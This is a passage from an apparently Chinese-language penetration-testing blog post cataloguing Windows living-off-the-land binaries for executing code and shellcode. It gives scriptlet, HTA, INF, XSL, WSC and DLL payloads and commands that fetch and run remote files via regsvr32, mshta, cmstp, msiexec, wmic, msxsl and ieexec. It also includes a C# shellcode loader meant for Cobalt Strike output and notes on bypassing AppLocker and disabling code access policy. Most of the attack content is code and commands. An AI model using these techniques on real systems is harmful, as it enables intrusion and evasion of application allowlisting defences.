class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;public&gt;</span><br><span class="line">    &lt;method name&#x3D;&quot;Exec&quot;&gt;&lt;&#x2F;method&gt;</span><br><span class="line">&lt;&#x2F;public&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">	function Exec()</span><br><span class="line">	&#123;</span><br><span class="line">		var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>

<p> 将这个文件保存好放到服务器上，再通过如下命令加载执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xx.xxx.xx.xxx:8011&#x2F;test.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807155737189.png" alt="image-20200807155737189"></p>
<h3 id="MSHTA"><a href="#MSHTA" class="headerlink" title="MSHTA"></a>MSHTA</h3><p><strong>什么是MSHTA?</strong></p>
<p> mshta是一个可以用来执行hta文件的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>

<p> hta文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot; </span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt; </span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806202058071.png" alt="image-20200806202058071"></p>
<h3 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h3><p> 控制面板就不用多讲了，直接看如何通过control去执行命令，首先将如下的内容编译为dll</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">WinExec(&quot;cmd.exe &#x2F;c calc&quot;, SW_SHOW);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 将生成的dll文件重命名为cpl，通过下面的命令执行cpl文件，加载cpl文件需要使用绝对路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">control.exe c:\xxxx\xxxxxxx\xxxxx.cpl</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806203405876.png" alt="image-20200806203405876"></p>
<p> 也可以通过其他的方式加载执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe shell32.dll,Control_RunDLL  C:\xx\xxxx\xxx\Dll4.cpl</span><br><span class="line">rundll32.exe shell32.dll,Control_RunDLLAsUser C:\Users\jerry\Desktop\Dll4.cpl</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806210718338.png" alt="image-20200806210718338"></p>
<h3 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h3><p> CMSTP是一个与Microsoft连接管理器配置文件安装程序关联的二进制文件。它接受INF文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL的形式执行任意代码。</p>
<p><strong>如何使用cmstp执行sct脚本?</strong></p>
<p> 首先将我们准备好的sct文件上传到web上，再编写inf文件去加载远程的sct文件，inf文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>

<p> 使用cmst调用inf脚本加载远程sct文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807163918589.png" alt="image-20200807163918589"></p>
<h3 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h3><p><strong>msiexec是什么？</strong></p>
<p> msiexec是一个windows系统自带的命令，可以用来安装Windows Installer安装包（MSI）</p>
<p><strong>如何制作msi文件？</strong></p>
<p> 我们知道msiexec只能执行msi文件，所以我们有必要了解msi文件该如何制作</p>
<p> 首先可以使用msf制作msi</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;exec CMD&#x3D;cmd.exe -f msi &gt; cmd.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807154506118.png" alt="image-20200807154506118"></p>
<p> 使用Advanced Installer制作msi文件，首先创建一个工程，创建好以后界面如下：</p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807160241692.png" alt="image-20200807160241692"></p>
<p> 找到用户自定义行为，加载文件，配置加载cmd文件</p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807160620661.png" alt="image-20200807160620661"></p>
<p> 还需要在生成的时候进行设置，设置后build即可生成一个msi文件</p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807162456780.png" alt="image-20200807162456780"></p>
<p> 安装后我们的命令就会被执行</p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807162547512.png" alt="image-20200807162547512"></p>
<p><strong>如何使用msiexec执行？</strong></p>
<p>方法一：直接双击执行</p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807154634996.png" alt="image-20200807154634996"></p>
<p>方法二： 加载本地文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec  &#x2F;q   &#x2F;i test.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807154717522.png" alt="image-20200807154717522"></p>
<p>方法三：远程加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.0.107&#x2F;cmd.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807155239472.png" alt="image-20200807155239472"></p>
<h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p> forfiles可以选择文件并在其上运行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m notepad.exe &#x2F;c calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807165115936.png" alt="image-20200807165115936"></p>
<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p> 首先准备一个xsl文件，文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>

<p> 将这个文件上传到web服务器上，再通过下面的命令加载执行,地址那需要加双引号，否则会有异常</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.0.107:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807171443469.png" alt="image-20200807171443469"></p>
<h3 id="Msxsl"><a href="#Msxsl" class="headerlink" title="Msxsl"></a>Msxsl</h3><p> msxsl虽然可以加载远程的文件执行，但是它不是windows自带的，需要去下载，好在这个文件本身也不大，就20k的样子，可以直接传给目标主机。</p>
<p> 通过如下方式执行xsl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807172754499.png" alt="image-20200807172754499"></p>
<h3 id="msbuild"><a href="#msbuild" class="headerlink" title="msbuild"></a>msbuild</h3><p> 使用msbuild可以编译xml c#的项目文件，msbuild.exe并不在windows的环境变量中，因此需要绝对路径进行加载。</p>
<p><strong>如何使用msbuild执行？</strong></p>
<p> 首先我们准备一个xml的<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml" target="_blank" rel="noopener">模板</a>,下载好后使用cs生成一个c#的shellcode，对xml中执行shellcode部分的内容进行替换，使用如下命令加载xml文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 1.xml</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807175852058.png" alt="image-20200807175852058"></p>
<h3 id="CSC-Installutil"><a href="#CSC-Installutil" class="headerlink" title="CSC+Installutil"></a>CSC+Installutil</h3><p> csc是一个C#的命令行编译工具，可以用来编译.cs文件。</p>
<p> Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。</p>
<p><strong>如何利用？</strong></p>
<p> 首先使用CS生成一个c#的shellcode，将生成的shellcode文件插入到<a href="https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260" target="_blank" rel="noopener">InstallUtil-Shellcode-cs</a>这个模板中，使用如下命令进行编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;r:System.EnterpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;out:C:\Users\admin\Desktop\xxxx\SharpCat.exe  &#x2F;unsafe C:\Users\admin\Desktop\xxx\InstallUtil-Shellcode.cs</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170200605.png" alt="image-20200810170200605"></p>
<p> 将生成的exe上传到目标主机，使用如下命令进行加载执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U SharpCat.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170509058.png" alt="image-20200810170509058"></p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170531338.png" alt="image-20200810170531338"></p>
<h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p> 微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula -d -s msiexec.exe &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxx:999&#x2F;cmd.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810171425659.png" alt="image-20200810171425659"></p>
<h3 id="WSC"><a href="#WSC" class="headerlink" title="WSC"></a>WSC</h3><p><strong>什么是WSC？</strong></p>
<p> Windows Script Components (WSC)，以前称为Scriplets，是一种以容易的方式开发强大的COM组件的技术。 WSC可以用任何实现了ActiveX脚本接口的脚本语言来编写，这意味着PerlScript代码单元可以封装为Windows脚本组件。</p>
<p><strong>怎么使用WSC执行命令？</strong></p>
<p> 首先我们创建一个wsc文件，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>

<p> 再创建一个js文件，文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:C:\\Users\\jerry\\Desktop\\test666.wsc&quot;);</span><br></pre></td></tr></table></figure>

<p> 最后通过csript 1.js执行命令</p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200804170202844.png" alt="image-20200804170202844"></p>
<p> 也可以将WSC文件挂载到远程，修改1.js中的内容,也可以执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxx.xxx.xx.xx:xxx&#x2F;test666&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="IEExec（利用失败）"><a href="#IEExec（利用失败）" class="headerlink" title="IEExec（利用失败）"></a>IEExec（利用失败）</h3><p> IEExec是一个Microsoft二进制文件，它是.NET Framework（v2.0.50727）的一部分，并且能够通过指定URL运行在远程目标上托管的应用程序。由于IEExec是Microsoft受信任的实用程序，因此攻击者可以绕过AppLocker和其他应用程序白名单解决方案来运行可执行文件。</p>
<p> 使用这种方式首先要禁用代码访问策略，允许执行.net代码,使用管理员权限运行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\CasPol.exe  -s off</span><br></pre></td></tr></table></figure>

<p> CasPol.exe文件在有些win10中和win2012中没有在v2.2.50727目录下，在v4.0.30319目录下，但是这个里面的CasPol没有-s参数。</p>
<p> 使用CS生成一个C#的shellcode并放到如下的执行模板中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace testIEexec</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        private static UInt32 MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line">        private static UInt32 MEM_RELEASE &#x3D; 0x8000;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 替换下面数组中的内容</span><br><span class="line">            byte[] proc &#x3D; new byte[894] &#123; 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00,............. &#125;;</span><br><span class="line">            UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length);</span><br><span class="line">            IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">            UInt32 threadId &#x3D; 0;</span><br><span class="line">            &#x2F;&#x2F; prepare data </span><br><span class="line">            PROCESSOR_INFO info &#x3D; new PROCESSOR_INFO();</span><br><span class="line">            IntPtr pinfo &#x3D; Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO)));</span><br><span class="line">            Marshal.StructureToPtr(info, pinfo, false);</span><br><span class="line">            &#x2F;&#x2F; execute native code </span><br><span class="line">            hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            &#x2F;&#x2F; retrive data </span><br><span class="line">            info &#x3D; (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO));</span><br><span class="line">            Marshal.FreeHGlobal(pinfo);</span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE);</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr GetModuleHandle(string moduleName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 LoadLibrary(string lpFileName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetLastError();</span><br><span class="line">        [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">        internal struct PROCESSOR_INFO</span><br><span class="line">        &#123;</span><br><span class="line">            public UInt32 dwMax;</span><br><span class="line">            public UInt32 id0;</span><br><span class="line">            public UInt32 id1;</span><br><span class="line">            public UInt32 id2;</span><br><span class="line">            public UInt32 dwStandard;</span><br><span class="line">            public UInt32 dwFeature;</span><br><span class="line">            &#x2F;&#x2F; if AMD </span><br><span class="line">            public UInt32 dwExt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 将该文件编译为exe，并且放到web上，使用如下命令进行加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http:&#x2F;&#x2F;xxx.xxx.xx.xx:803&#x2F;test.exe</span><br></pre></td></tr></table></figure>

<p> 这里我测试虽然请求了远程的地址，但是并没有上线，原因未知，这种方式比较鸡肋，因为我在其他的windows10和2012中没有找到ieexec.exe这个文件。</p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810140930599.png" alt="image-20200810140930599"></p>
<h3 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h3><p> Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。</p>
<p> 可以使用下面的方式执行本地exe文件</p>
